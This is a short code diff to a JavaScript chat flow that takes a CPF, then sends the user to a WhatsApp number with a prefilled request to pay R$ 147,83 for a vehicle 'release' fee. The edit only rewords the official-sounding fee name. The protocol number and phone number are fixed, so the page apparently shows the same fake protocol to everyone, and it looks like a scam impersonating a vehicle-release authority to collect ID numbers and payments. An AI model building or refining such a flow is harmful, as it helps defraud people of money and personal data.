@@ -195,8 +195,8 @@ if (cpfInput && cpfSubmit && consultaChat) {
       appendQuickReplies(["Sim", "Não"], async (finalAnswer) => {
         if (finalAnswer === "Sim") {
           const whatsappMessage =
-            "Olá, gostaria de realizar o pagamento da guia de liberação " +
-            "no valor de R$ 147,83, referente à liberação do meu veículo. Protocolo: 2026841285";
+            "Olá, gostaria de realizar o pagamento do Ofício de Liberação " +
+            "no valor de R$ 147,83. Referente ao meu veículo. Protocolo: 2026841285";
           const whatsappNumber = "5511975948859";
           const whatsappUrl = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(whatsappMessage)}`;
           window.location.href = whatsappUrl;
